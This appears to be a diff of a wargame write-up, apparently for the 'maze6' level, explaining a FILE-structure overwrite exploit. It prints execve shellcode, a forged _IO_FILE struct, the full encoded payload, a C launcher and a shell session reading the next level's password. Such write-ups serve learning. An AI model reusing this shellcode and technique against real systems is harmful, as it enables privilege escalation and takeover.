@@ -10,7 +10,7 @@ It leveraged an exploit I had no clue existed, and taught me a lot about how fil
 
 If we were to rougly recreate the source code, it'd look like this:
 
-                        maze6.c (recreated):
+                   maze6.c (recreated):
 ┌─────────────────────────────────────────────────────────────┐
 │  int main(int argc, char*[] argv){                          │
 │      if(argc != 3){                                         │
@@ -115,4 +115,131 @@ it'll write the begging of the format string before it writes the four bytes we 
 So to create the exploit, we'll push multiple items onto the stack with argv[1], overriding the file pointer.
 
 Through a lot of trial and tribulation, I found this order:
-shellcode_addr + 'TTRASH' + shellcode + cyclic(197) + fake_file_addr + cyclic(12) + busted_loc_addr + b'k'*9 + 'busted\x00' + busted_addr + 'FAKEFILE=' + fake_file(writeloc) + b'tras')
+┌───────────────────────────────────────────────────────────────────────────────────────┐
+│address_of_shellcode + 'TTRASH' + shellcode + 197*'A' + fake_file_address + 12*'A' +   │
+│busted_loc_addr + 9*'A' + 'busted\x00' + busted_addr + 'FAKEFILE=' + fake_file + 'tras'│
+└───────────────────────────────────────────────────────────────────────────────────────┘
+
+This being the shellcode:
+'SHELLCODE=\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x89\xe5\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x8d\x0c\x24\x31\xc0\x50\x51\x8b\x1c\x24\x89\xe1\xb0\x0b\xcd\x80'
+
+and this being the crafted fake file struct (crafted based off of the gdb dereferenced fp output):
+'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xd9\x98\x04\x08
+\xe0\x98\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x40\x7c\xf9\xf7\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x7d\xd0\xff\xff\xff\xff\xff\xff
+\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x80\x85\xf9\xf7\x74\x72\x61\x73'
+
+or, using python2's version of pwntools 
+(idea from https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/):
+
+┌──────────────────────────────────────────────────────────┐
+│def forge_file():                                         │
+│   #var addresses defined...                              │
+│   struct = p32(0x0)                #  _flags             │
+│   struct += p32(0x0)               #  _IO_read_ptr       │
+│   struct += p32(0x0)               #  _IO_read_end       │
+│   struct += p32(0x0)               #  _IO_read_base      │
+│   struct += p32(0x0)               #  _IO_write_base     │
+│   struct += p32(0x0)               #  _IO_write_ptr      │
+│   struct += p32(0x0)               #  _IO_write_end      │
+│   struct += p32(writeaddr)         #  _IO_buf_base       │
+│   struct += p32(writeend)          #  _IO_buf_end        │
+│   struct += p32(0x0)               #  _IO_save_base      │
+│   struct += p32(0x0)               #  _IO_backup_base    │
+│   struct += p32(0x0)               #  _IO_save_end       │
+│   struct += p32(0x0)               #  _markers           │
+│   struct += p32(_chain)            #  _chain             │
+│   struct += p32(0x0)               #  _fileno            │
+│   struct += p32(0x0)               #  _flags2            │
+│   struct += p32(0x0)               #  _cur_column        │
+│   struct += p32(0x0)               #  _vtable_offset     │
+│   struct += p32(_lock)             #  _lock              │
+│   struct += p32(0xffffffff)        #  _offset            │
+│   struct += p32(0xffffffff)        #  _offset pt 2       │
+│   struct += p32(0x0)               #  __pad1             │
+│   struct += p32(0x0)               #  __pad2             │
+│   struct += p32(0x0)               #  __pad3             │
+│   struct += p32(0x0)               #  __pad4             │
+│   struct += p32(0x0)               #  __pad5             │
+│   struct += p32(0x0)               #  _mode              │
+│   struct += '\x00'*40              # _unused             │
+│   struct += p32(_vtable)                                 │
+│   return struct                                          │
+└──────────────────────────────────────────────────────────┘
+
+address_of_shellcode is what will be overwriting exit's address in the procedure linkage table.
+'TRASHH'/tras/AAA...AAA/etc are all trash bytes to take up space
+fake_file_address is the location after 'FAKEFILE=', which is the address of the forged file struct.
+'busted' is provided as an argument for fprintf's '%s'.
+'busted_addr' points to that string, and 'busted_loc_addr' acts as a double pointer to 'busted'
+
+Of course, this is all supposed to be passed in as argv[2] - but there are so many null bytes!
+Fortunately because the level memfrobs the data, we can still do that anyway... all the null bytes get converted to the * symbol.
+
+So adjusted for the server, with all of the bytes memfrob'd and typed out, this ends up being the complete and total argv[2] payload:
+
+                               maze6 payload bytes:
+┌─────────────────────────────────────────────────────────────────────────────────────┐
+│"\xb2\xf1\xd5\xd5\x7e\x7e\x6f\x79\x7e\x2a\x79\x62\x6f\x66\x66\x69\x65\x6e\x6f\x17    │
+│\x1b\xea\x1b\xf1\x1b\xe3\x1b\xf8\xa3\xcf\x1b\xea\x7a\x42\x05\x05\x59\x42\x42\x05     │
+│\x48\x43\x44\xa7\x26\x0e\x1b\xea\x7a\x7b\xa1\x36\x0e\xa3\xcb\x9a\x21\xe7\xaa\x4b     │
+│\x4b\x4b\x4b\x48\x4b\x4b\x4b\x49\x4b\x4b\x4b\x4e\x4b\x4b\x4b\x4f\x4b\x4b\x4b\x4c     │
+│\x4b\x4b\x4b\x4d\x4b\x4b\x4b\x42\x4b\x4b\x4b\x43\x4b\x4b\x4b\x40\x4b\x4b\x4b\x41     │
+│\x4b\x4b\x4b\x46\x4b\x4b\x4b\x47\x4b\x4b\x4b\x44\x4b\x4b\x4b\x45\x4b\x4b\x4b\x5a     │
+│\x4b\x4b\x4b\x5b\x4b\x4b\x4b\x58\x4b\x4b\x4b\x59\x4b\x4b\x4b\x5e\x4b\x4b\x4b\x5f     │
+│\x4b\x4b\x4b\x5c\x4b\x4b\x4b\x5d\x4b\x4b\x4b\x52\x4b\x4b\x4b\x53\x4b\x4b\x4b\x50     │
+│\x4b\x4b\x48\x48\x4b\x4b\x48\x49\x4b\x4b\x48\x4e\x4b\x4b\x48\x4f\x4b\x4b\x48\x4c     │
+│\x4b\x4b\x48\x4d\x4b\x4b\x48\x42\x4b\x4b\x48\x43\x4b\x4b\x48\x40\x4b\x4b\x48\x41     │
+│\x4b\x4b\x48\x46\x4b\x4b\x48\x47\x4b\x4b\x48\x44\x4b\x4b\x48\x45\x4b\x4b\x48\x5a     │
+│\x4b\x4b\x48\x5b\x4b\x4b\x48\x58\x4b\x4b\x48\x59\x4b\x4b\x48\x5e\x4b\x4b\x48\x5f     │
+│\x4b\x4b\x48\x5c\x4b\x4b\x48\x5d\x4b\x4b\x48\x52\x4b\x4b\x48\x53\x9f\xf6\xd5\xd5     │
+│\x4b\x4b\x4b\x4b\x48\x4b\x4b\x4b\x49\x4b\x4b\x4b\x8e\xf6\xd5\xd5\x41\x41\x41\x41     │
+│\x41\x41\x41\x41\x41\x48\x5f\x59\x5e\x4f\x4e\x2a\x8b\xf6\xd5\xd5\x6c\x6b\x61\x6f     │
+│\x6c\x63\x66\x6f\x17\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
+│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\xf3\xb2\x2e\x22\xca\xb2\x2e     │
+│\x22\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x6a\x56\xd3     │
+│\xdd\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x8a\x8a\x2e     │
+│\x22\xd5\xd5\xd5\xd5\xd5\xd5\xd5\xd5\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
+│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
+│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a     │
+│\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x4a\x13\xd6\xdd\x5e\x58\x4b     │
+│\x59"                                                                                │
+└─────────────────────────────────────────────────────────────────────────────────────┘
+
+I took those bytes into a wrapper function with a clean environment, and executed it.
+
+
+┌──────────────────────────────────────────────────────────────────┐
+│#define _GNU_SOURCE                                               │
+│#include <string.h>                                               │
+│#include <unistd.h>                                               │
+│                                                                  │
+│int main(void) {                                                  │
+│	char *environment[1] = {0};                                │
+│	char *payload = "..."; //same bytes as above               │
+│	char *argv[4] = {"/maze/maze6", "public", payload, 0};     │
+│	execve("/maze/maze6", argv, environment);                  │
+│}                                                                 │
+└──────────────────────────────────────────────────────────────────┘
+
+Uploaded it to the server, compiled, and ran it...
+┌──────────────────────────────────────────────────────────────────┐
+│maze6@maze:~$ cd /tmp/tald6                                       │
+│maze6@maze:/tmp/tald6$ gcc -m32 serverwrapper.c -o wrap; ./wrap   │
+│busted : TTEST$ whoami                                            │
+│maze7                                                             │
+│$ cat /etc/maze_pass/maze7                                        │
+│**********                                                        │
+│$                                                                 │
+└──────────────────────────────────────────────────────────────────┘
+And boom! a shell with escalated privileges...
+
+Definitely one of the most complicated binary exploitation levels I've attempted, and it
+taught me a lot!
+
